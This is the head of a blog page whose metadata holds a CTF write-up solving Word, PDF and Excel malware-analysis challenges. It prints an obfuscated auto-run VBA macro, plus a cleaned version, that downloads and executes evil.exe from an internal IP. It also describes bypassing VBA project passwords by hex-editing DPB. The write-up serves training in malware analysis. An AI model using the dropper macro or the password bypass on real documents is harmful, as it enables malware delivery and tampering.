
<!doctype html>
<html lang="en-US">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="preload" href="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/clearbit-autocomplete.css" as="style">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://usageanalytics.coveo.com">
  <link rel="preconnect" href="https://paloaltonetworks.tt.omtrdc.net">
  <link rel="preconnect" href="https://platform.cloud.coveo.com">
  <link rel="preconnect" href="https://assets.adobedtm.com">
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
  <!-- Adobe -->
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {opacity: 0 !important}", 3000));
</script>
<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<!-- End Adobe -->
  
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap" rel="stylesheet">

  <!-- Typekit -->
  <!--
  <script src="//use.typekit.net/itd3sep.js"></script>
  <script>try{Typekit.load({ async: true });}catch(e){}</script>-->
  <!-- End Typekit -->

 


    


<link rel="apple-touch-icon" sizes="57x57" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/favicon-194x194.png" sizes="194x194">
<link rel="icon" type="image/png" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/manifest.json">
<link rel="mask-icon" href="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/safari-pinned-tab.svg" color="#8ad3de">
<link rel="shortcut icon" href="https://blog.paloaltonetworks.com/wp-content/themes/panwblog2020/assets/images/icons/favicon.ico">
<meta name="msapplication-TileImage" content="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/mstile-144x144.png">
<meta name="msapplication-config" content="https://www.paloaltonetworks.com/etc/clientlibs/pan/img/favicons2020/browserconfig.xml">
<meta name="msapplication-TileColor" content="#da532c">




  <!-- Start WP HEAD -->
  <link rel="alternate" hreflang="en" href="https://blog.paloaltonetworks.com/2016/08/labyrenth-capture-the-flag-ctf-document-track-solutions/" />

	<!-- This site is optimized with the Yoast SEO plugin v14.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>LabyREnth Capture the Flag (CTF): Document Track Solutions</title>
	<meta name="description" content="Thanks to the talented community of threat researchers that participated in LabyREnth. Here are the solutions to the Document track." />
	<meta name="robots" content="index, follow" />
	<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://blog.paloaltonetworks.com/2016/08/labyrenth-capture-the-flag-ctf-document-track-solutions/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="LabyREnth Capture the Flag (CTF): Document Track Solutions" />
	<meta property="og:description" content="Thanks to the talented community of threat researchers that participated in LabyREnth. Here are the solutions to the Document track." />
	<meta property="og:url" content="https://blog.paloaltonetworks.com/2016/08/labyrenth-capture-the-flag-ctf-document-track-solutions/" />
	<meta property="og:site_name" content="Palo Alto Networks Blog" />
	<meta property="article:published_time" content="2016-08-18T20:00:20+00:00" />
	<meta property="article:modified_time" content="2016-08-18T20:06:23+00:00" />
	<meta property="og:image" content="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled1-1-500x243.png" />
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Palo Alto Networks Blog &raquo; Feed" href="https://blog.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Palo Alto Networks Blog &raquo; Comments Feed" href="https://blog.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Palo Alto Networks Blog &raquo; LabyREnth Capture the Flag (CTF): Document Track Solutions Comments Feed" href="https://blog.paloaltonetworks.com/2016/08/labyrenth-capture-the-flag-ctf-document-track-solutions/feed/" />
<meta property="og:date_created" content="August 18, 2016 at 1:00 PM"/>
<meta property="og:post_image" content=""/>
<meta property="og:post_id" content="17284"/>
<meta property="og:post_total_likes" content="1"/>
<meta property="og:post_length" content="2279"/>
<meta property="og:category" content="Events"/>
<meta property="og:category_link" content="https://blog.paloaltonetworks.com/category/events/"/>
<meta property="og:author" content="Richard Wartell"/>
<meta property="og:author" content="Tyler Halfpop"/>
<meta property="og:author" content="Jeff White"/>
<meta property="og:authorloginname" content="Richard Wartell"/>
<meta property="og:authorloginname" content="Tyler Halfpop"/>
<meta property="og:authorloginname" content="Jeff White"/>
<meta property="og:authorlink" content="https://blog.paloaltonetworks.com/author/richard-wartell/"/>
<meta property="og:authorlink" content="https://blog.paloaltonetworks.com/author/tyler-halfpop/"/>
<meta property="og:authorlink" content="https://blog.paloaltonetworks.com/author/jeff-white/"/>
<meta property="og:author_image_link" content="https://blog.paloaltonetworks.com/wp-content/uploads/2017/05/unit42_400x400.jpg"/>
<meta property="og:author_image_link" content="https://blog.paloaltonetworks.com/wp-content/uploads/2016/09/tyler-halfpop.png"/>
<meta property="og:author_image_link" content="https://blog.paloaltonetworks.com/wp-content/uploads/2017/05/unit42_400x400.jpg"/>
<meta property="og:section" content="Palo Alto Networks"/>
<meta property="og:recent_views" content="657"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"LabyREnth Capture the Flag (CTF): Document Track Solutions","name":"LabyREnth Capture the Flag (CTF): Document Track Solutions","description":"Thanks to the incredibly talented community of threat researchers that participated in LabyREnth, the Unit 42 Capture the Flag (CTF) challenge. Now that the challenge is closed, we can finally reveal the &hellip;","url":"https:\/\/blog.paloaltonetworks.com\/2016\/08\/labyrenth-capture-the-flag-ctf-document-track-solutions\/","mainEntityOfPage":"https:\/\/blog.paloaltonetworks.com\/2016\/08\/labyrenth-capture-the-flag-ctf-document-track-solutions\/","datePublished":"August 18, 2016","articleBody":"Thanks to the incredibly talented community of threat researchers that participated in LabyREnth, the Unit 42 Capture the Flag (CTF) challenge. Now that the challenge is closed, we can finally reveal the solutions of each challenge track. We\u2019ll be rolling out the solutions for one challenge track per week. First up, the Document track.\r\n\r\n\r\nDocument 1 Challenge: Maaa, why you clickz such macro?\r\nChallenge Created By: Tyler Halfpop @0xtyh\r\n\r\nWhen we open the document, we see this image that is commonly found in a lot of document malware. We also have a prompt on top to enable macros.\r\n\r\n\r\n\r\nIf we enable macros and have a tool like FakeNet running, then we get the following output:\r\n\r\n\r\n\r\nThis looks interesting, it is trying to download an evil.exe from an RFC 1918 internal IP address 10.1.133.7. We can look at the macros using the macro viewer in Word or by dumping them with a tool like olevba from decalge.\r\nPrivate Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)\r\nDim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA\r\nvSHOfSrEta = ActiveDocument.Variables(\"ppKzr\").Value()\r\ngsFEVmmIzO = \"\"\r\ndHLdiEqdts = 1\r\nWhile dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2\r\neUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)\r\ngsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))\r\ndHLdiEqdts = dHLdiEqdts + 1\r\nWend\r\nQklkhFEQNB = gsFEVmmIzO\r\nEnd Function\r\nPublic Function BkAIuNwQNDkohBY()\r\ntwOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _\r\n78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _\r\n12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _\r\n9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _\r\n2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _\r\n30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _\r\n62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _\r\n1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)\r\nUkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188)\r\nDim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))\r\nDim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))\r\nxHttp.Open UkIWIEtqCF, twOvwCSTPL, False\r\nxHttp.Send\r\nWith bStrm\r\n.Type = 1\r\n.Open\r\n.write xHttp.responseBody\r\n.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2\r\nEnd With\r\nShell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))\r\nEnd Function\r\nPrivate Sub Document_Open()\r\nIf ActiveDocument.Variables(\"ppKzr\").Value &lt;&gt; \"toto\" Then\r\nBkAIuNwQNDkohBY\r\nActiveDocument.Variables(\"ppKzr\").Value = \"toto\"\r\nIf ActiveDocument.ReadOnly = False Then\r\nActiveDocument.Save\r\nEnd If\r\nEnd If\r\nEnd Sub\r\n\r\nAs we can see, this code has its strings encoded and is obfuscated, and when we clean it up, it\u2019s pretty simple:\r\nPublic Function Beacon()\r\nx = \"http:\/\/10.1.33.7\/b64\/x58\/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=\/evil.exe\"\r\ny = \"GET\"\r\nDim xHttp: Set xHttp = CreateObject(\"Microsoft.XMLHTTP\")\r\nDim bStrm: Set bStrm = CreateObject(\"Adodb.Stream\")\r\nxHttp.Open y, x, False\r\nxHttp.Send\r\nWith bStrm\r\n    .Type = 1\r\n        .Open\r\n            .write xHttp.responseBody\r\n                .savetofile \"bad.exe\", 2\r\n                End With\r\n                Shell (\"bad.exe\")\r\n                End Function\r\n\r\n\r\nNow we can see this matches what we saw in FakeNet. It looks like the URL that it\u2019s looking up is in base64. If we decode it, we get:\r\n&gt;&gt;&gt; base64.b64decode(\"MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=\")\r\n'081916230e3102313a696b07683634216a2c30682b6b070f3068071336682f072f306b2a6b6a3468683325'\r\n\r\nThis looks like an ascii hex string, but if we convert it to bytes, we don\u2019t get anything interesting. However, the URI also includes another single byte (we assume since it starts with x) of x58. If we try decoding the hex string with that byte, we get the key. Here is an example Python script to print the key from the URI.\r\n\r\n&nbsp;\r\na = \u201c\u201d\r\ns = \"MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=\".decode('base64')\r\nfor i, x in zip(s[0::2], s[1::2]):\r\n          a+=chr(int(str(i+x), 16)^0x58)\r\nprint a\r\n\r\nPAN{ViZib13_0nly2th0s3_Wh0_Kn0w_wh3r32l00k}\r\n\r\nDocument 2 Challenge: Can you crack doc?\r\nChallenge Created By: Tyler Halfpop @0xtyh\r\n\r\nFor this challenge, we\u2019re provided a file named \u201cCrackDoc.doc\u201d and when we open it, we\u2019re presented with a \u2018UsersForm1\u2019 prompt for \u2018Key\u2019 value.\r\n\r\n\r\n\r\nTyping in the wrong key displays a message \u201cU can do. Try harder\u2026\u201d accompanied by a sweet picture of doge.\r\n\r\n\r\n\r\nIf we attempt to look at the underlying macros, we can see that the VBProject is password protected.\r\n\r\n\r\n\r\nTo circumvent this, we\u2019ll simply load the document up in our favorite hex editor and modify the string \u2018DPB=\u201d\u2019 to \u2018DPX=\u201d\u2019.\r\n\r\n\r\n\r\nWe\u2019ve now corrupted the document so that when we re-open the file and it parses this string, it will find it to be an invalid key. However, it still allows us to load the project, thus bypassing the protection \u2018DPB\u2019 provided.\r\n\r\n\r\n\r\nOnce inside the project, you can go into the \u2018Project Properties\u2019 and uncheck \u2018Lock project for viewing\u2019 under the \u2018Protection\u2019 tab to remove the password permanently.\r\n\r\nLooking at the code, we have a form called \u2018UserForm1\u2019 and a module called \u2018NewMacros\u2019. If we right click on the form and go to \u2018View Code\u2019, we see the underlying macro we\u2019re interested in and immediately see a byte-array for the key.\r\n\r\n\r\n\r\nWe can see that if X equals the string of bytes, then we get our win message. The value X is derived from the \u2018suchcrypto\u2019 function being passed our input and the IV \u2018General Vidal\u2019. The function doesn\u2019t look particularly difficult to reverse.\r\n\r\n\r\n\r\nBut I opted to take an even lazier route to beat this challenge. I decided to fight macro with macro. By creating an array of potential values and passing each of them to the \u2018suchcrypto\u2019 function, I am able to easily enumerate what the key is and when I find a matching value, move on to the next.\r\n\r\nBy using the full array and Notepad++, I record a small macro of hitting the up arrow a few times and deleting the last byte, before copying and pasting the result then doing it again. What I\u2019m left with is a long list of \u2018For\u2019 loops that I can copy into the \u2018UserForm()\u2019 macro.\r\n\r\nStarting with:\r\n\r\n\r\n\r\nEnding with:\r\n\r\n\r\n\r\nNow we just hit enter a few times and watch the key unwind itself for us!\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nPAN{L4$t_Night_@f@iry_Vizited_M3}\r\nDocument 3 Challenge: Adobe, pls\r\nChallenge Created By: Curtis Carmony @c1fe\r\n\r\nI started out debugging the extracted javascript. I was feeling pretty clever when I found the decoded YouTube URL until Rick Astley started singing that he was never going to give me up. Nice Rick Roll Curtis! I hope it got some of you out there as well.\r\n\r\n\r\n\r\nNext, I went through the different streams in Cerbero profiler and saw the JS tag with hex in the first object.\r\n\r\n\r\n\r\nI put that into a hex editor and then tested the key to complete the challenge.\r\n\r\n\r\n\r\n\r\nDocument 4 Challenge: Macros are fun.\r\nChallenge Created By: Curtis Carmony @c1fe\r\n\r\nFor this challenge, we\u2019re provided a file \u201cfun.docm\u201d, with the extension implying that we\u2019ll be having (no)fun with macros!\r\n\r\nAfter opening the document, we\u2019re presented with the text \u201cMORE MACROS = MORE FUN\u201d in large color-changing font with a lovely air-horn sound that plays on repeat. Attempting to open the VB Project reveals that it\u2019s password protected, so we\u2019ll need to bypass this first.\r\n\r\n\r\n\r\nAs the new format for Doc files are archives, we\u2019ll open it up in 7z and look for the \u2018vbaProject.bin\u2019 file under the \u2018\\word\\\u2019 directory. Open this up in a hex editor and search for the string \u2018DPB=\u201d\u2019 then simply change it to something like \u2018DPX=\u201d\u2019 and save the file. When you load the file now you\u2019ll receive an error about the project containing an invalid key with an option to continue loading it anyway. Now you\u2019ll be able to access the VB Project and can go into the Project Properties and unselect \u2018Lock project for viewing\u2019 to remove the password protection.\r\n\r\n\r\n\r\nLooking at the project, we can see that there are two forms, \u2018NpuXrzgq\u2019 and \u2018U8pblvDZuAh8Gy\u2019, along with one module \u2018Z1yiWeP\u2019. Looking at the code in the main document and the module, it looks like there are a lot of functions so we\u2019ll start by debugging it and get a feel for what it\u2019s trying to do. Putting a \u2018Stop\u2019 after the initial \u2018Document_Open()\u2019 function starts the process.\r\n\r\n\r\n\r\nBefore even getting into the meat of the macro we can see we may have a problem as it\u2019s checking if there are four \u2018VBcomponents\u2019 when we only have three. Stepping through the \u2018zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k\u2019 function, we find this to be the series of events that decode the embedded WAV file and continuously play the air-horn while changing the text in the document.\r\n\r\nIf we adjust the code so it doesn\u2019t fail the first check, we follow the macro to \u2018XiqyXdC809pP5esSrC633ag92w0x6otQylY0\u2019 function, which immediately calls \u2018zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy\u2019 and then begins to enumerate the function names.\r\n\r\n\r\n\r\nThe function \u2018BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz\u2019 begins a process of base-64 decoding the function name and then modifying the byte-values based on various fields of the document.\r\n\r\n\r\n\r\nBoth of the functions are one-byte XoR\u2019s, 44 and 32 respectively, which then get compared to the base-64 decoded value of \u2018U8pblvDZuAh8GY.Label1.Caption\u2019, which is \u2018xRgWTqWr7ipEjFBfESrOiaYFu9i9Jml3Q171\u2019.\r\n\r\n\r\n\r\nBased on this, we can grab all of the function names and quickly determine the match by base64 decoding each and XoR\u2019ing the bytes by 44 and 32.\r\n&gt;&gt;&gt; a = base64.b64decode(\"yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5\")\r\n&gt;&gt;&gt; b = base64.b64decode(\"xRgWTqWr7ipEjFBfESrOiaYFu9i9Jml3Q171\")\r\n&gt;&gt;&gt; b\r\n'\\xc5\\x18\\x16N\\xa5\\xab\\xee*D\\x8cP_\\x11*\\xce\\x89\\xa6\\x05\\xbb\\xd8\\xbd&amp;iwC^\\xf5'\r\n&gt;&gt;&gt; c = \"\"\r\n&gt;&gt;&gt; for i in a:\r\n...     c += chr(ord(i) ^ 44 ^ 32)\r\n...\r\n&gt;&gt;&gt; c\r\n'\\xc5\\x18\\x16N\\xa5\\xab\\xee*D\\x8cP_\\x11*\\xce\\x89\\xa6\\x05\\xbb\\xd8\\xbd&amp;iwC^\\xf5'\r\n\r\nNow that we have our interesting function name, we can force the macro to use this value and continue debugging it.\r\n\r\nBack in the \u2018XiqyXdC809pP5esSrC633ag92w0x6otQylY0\u2019 function, it will take another function name, \u2018d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql\u2019 and pass it along with our matching name to another function, which base64 decodes \u2018d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql\u2019 into an array before sending us to function \u2018XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM\u2019 which has a \u2018MsgBox\u2019 call, presumably to print our flag!\r\n\r\nLooking at the function we can see there are a few more XoR and comparison checks against property values for the forms within the VBProject.\r\n\r\n\r\n\r\n\r\n\r\nAt this point it XoR\u2019s the \u2018d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql\u2019 function name by 144 and 85, takes the result of that and XoR\u2019s it against the base-64 decoded value of \u2018XJCR\/DogZt7bduvvusJgAQu6QX9DmtKN+bZB\u2019 to see if they match\u2026which they won\u2019t.\r\n\r\nSince we know two parts of the puzzle, we can just work backwards to figure out what the initial second function name should be and go from there. We\u2019ll base-64 decode the \u2018XJCR\u2019 string and \u2018yRQa\u2019 string, XoR them together, then XoR each resulting byte by 144 and 85.\r\n&gt;&gt;&gt; a = base64.b64decode(\"yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5\")\r\n&gt;&gt;&gt; b = base64.b64decode(\"XJCR\/DogZt7bduvvusJgAQu6QX9DmtKN+bZB\")\r\n&gt;&gt;&gt; c = \"\"\r\n&gt;&gt;&gt; for index,value in enumerate(a):\r\n...     c += chr((ord(value) ^ ord(b[index])) ^ 144 ^ 85)\r\n...\r\n&gt;&gt;&gt; c\r\n'PAN{VBA=V3ryb!gAdv3n7ur3s!}'\r\n\r\nDocument 5 Challenge: EXCEL.EXE not just CALC.EXE\r\nChallenge Created By: Curtis Carmony @c1fe\r\n\r\nWe are given an Excel document that has a Crackme. When we try to test a key, a cheeky popup appears, tells us we are wrong, closes Excel, and launches calc.exe.\r\n\r\n\r\n\r\nWhen we open the document back up and look at the macros there is only one very simple macro to close the document, so there are definitely some shenanigans.\r\nSub excelulate()\r\n\r\n   Application.Quit\r\n\r\nEnd Sub\r\n&nbsp;\r\n\r\nIf we right click on the sheets on the bottom and click unhide there is a secret hidden sheet.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nIf we go to the secret sheet, click \u201cShow Formulas\u201d and make the font black then we can see there are Excel functions in the cells. There is one cell that looks interesting at A14 that is referring to a super secret sheet that we cannot see.\r\n\r\n\r\n\r\nI modified the macro to try and make all of the sheets visible and clicked the button.\r\nSub excelulate()\r\nDim x As Worksheet\r\nFor Each x In Sheets\r\n    x.Visible = True\r\nNext\r\nEnd Sub\r\n\r\nWe can now see a super secret sheet with more formulas. It is pretty amazing that there can be hidden and then super hidden sheets in Excel.\r\n\r\n\r\n\r\nIf we remove uncheck \u201cShow Formulas\u201d and remove everything from F13 besides the concatenate function, Excel will print the formula for us.\r\n\r\n=CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16)\r\n\r\n\r\n\r\nIf we enter that key into the original file we get the winning message and find that we are the EXCELULATOR! It is pretty amazing all the things you can do with Excel.\r\n\r\n\r\n\r\nLeave a comment below to share your thoughts about these challenges. Be sure to also check out how other threat researchers solved these challenges:\r\nDocument 1 Challenge\r\n\r\n \thttps:\/\/dbheise.github.io\/2016\/08\/15\/2016-Palo-Alto-Labyrenth-CTF-Doc-01\/\r\n \thttps:\/\/github.com\/uafio\/git\/blob\/master\/scripts\/labyREnth-2016\/labyrenth-2016-docs-1.py\r\n\r\nDocument 2 Challenge\r\n\r\n \thttps:\/\/dbheise.github.io\/2016\/08\/15\/2016-Palo-Alto-Labyrenth-CTF-Doc-02\/\r\n \thttps:\/\/github.com\/uafio\/git\/blob\/master\/scripts\/labyREnth-2016\/labyrenth-2016-docs-2.py\r\n\r\nDocument 3 Challenge\r\n\r\n \thttps:\/\/dbheise.github.io\/2016\/08\/15\/2016-Palo-Alto-Labyrenth-CTF-Doc-03\/\r\n \thttps:\/\/github.com\/uafio\/git\/blob\/master\/scripts\/labyREnth-2016\/labyrenth-2016-docs-3.txt\r\n\r\nDocument 4 Challenge\r\n\r\n \thttps:\/\/dbheise.github.io\/2016\/08\/15\/2016-Palo-Alto-Labyrenth-CTF-Doc-04\/\r\n \thttps:\/\/github.com\/uafio\/git\/blob\/master\/scripts\/labyREnth-2016\/labyrenth-2016-docs-4.py\r\n\r\nDocument 5 Challenge\r\n\r\n \thttps:\/\/dbheise.github.io\/2016\/08\/15\/2016-Palo-Alto-Labyrenth-CTF-Doc-05\/\r\n \thttps:\/\/github.com\/uafio\/git\/blob\/master\/scripts\/labyREnth-2016\/labyrenth-2016-docs-5.txt\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Richard Wartell"},{"@type":"Person","name":"Tyler Halfpop"},{"@type":"Person","name":"Jeff White"}]}</script>		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.paloaltonetworks.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
			/*! This file is auto-generated */
			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='crayon-css'  href='https://blog.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://blog.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://blog.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css'  href='https://blog.paloaltonetworks.com/wp-content/plugins/contact-form-7/includes/css/styles.css' type='text/css' media='all' />
<style id='contact-form-7-inline-css' type='text/css'>
.wpcf7 .wpcf7-recaptcha iframe {margin-bottom: 0;}.wpcf7 .wpcf7-recaptcha[data-align="center"] > div {margin: 0 auto;}.wpcf7 .wpcf7-recaptcha[data-align="right"] > div {margin: 0 0 0 auto;}
</style>
<link rel='stylesheet' id='dashicons-css'  href='https://blog.paloaltonetworks.com/wp-includes/css/dashicons.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://blog.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css' type='text/css' media='all' />
